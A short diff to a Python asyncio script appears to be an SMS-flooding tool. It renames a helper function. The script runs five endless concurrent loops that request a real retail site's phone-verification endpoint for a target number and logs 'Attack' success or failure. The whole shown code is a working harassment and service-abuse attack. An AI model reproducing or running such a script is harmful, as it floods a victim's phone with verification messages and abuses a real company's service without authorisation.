@@ -15,14 +15,14 @@ async def make_request(session, url):
         else:
             print("Attack Fail Status API : ", response.status)
 
-async def repeat_request(session, url):
+async def loop_request(session, url):
     while True:
         await make_request(session, url)
 
 async def main():
     url = f"https://hdmall.co.th/phone_verifications?mobile={phone}"
     async with aiohttp.ClientSession() as session:
-    	coroutines = [repeat_request(session, url) for _ in range(5)]
+    	coroutines = [loop_request(session, url) for _ in range(5)]
     	await asyncio.gather(*coroutines)
 
 
